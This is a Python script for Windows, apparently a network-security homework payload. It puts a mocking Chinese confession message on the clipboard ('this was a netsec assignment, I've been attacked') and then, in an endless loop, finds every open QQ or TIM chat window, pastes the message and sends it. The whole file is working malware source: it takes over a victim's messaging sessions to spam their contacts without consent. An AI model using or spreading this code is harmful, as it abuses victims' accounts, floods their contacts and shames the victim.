import win32con,time
import win32clipboard as w
import win32gui
import win32process
import psutil


def get_all_hwnd(hwnd, mouse):
    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
        hwnd_title.update({hwnd: win32gui.GetWindowText(hwnd)})
if __name__ =="__main__":

    # 发送的消息
    msg = "我以为天底下有免费的午餐，没想到这竟然是网安大作业，我被攻击了！！！我以后再也不贪心了><呜呜呜~"
    # 窗口名字
    # 将测试消息复制到剪切板中
    w.OpenClipboard()
    w.EmptyClipboard()
    w.SetClipboardData(win32con.CF_UNICODETEXT, msg)
    w.CloseClipboard()

    while True:
        hwnd_title = dict()
        win32gui.EnumWindows(get_all_hwnd, 0)
        for h, t in hwnd_title.items():
            # 获取窗口句柄
            name = t
            handle = win32gui.FindWindow(None, name)
            thread_id, process_id = win32process.GetWindowThreadProcessId(h)
            process = psutil.Process(process_id)
            if(process.name()=="TIM.exe"or process.name()=="QQ.exe"):
                # 填充消息
                win32gui.SendMessage(handle, 770, 0, 0)
                # 回车发送消息
                win32gui.SendMessage(handle, win32con.WM_KEYDOWN, win32con.VK_RETURN, 0)

        # test_windows_window(h)

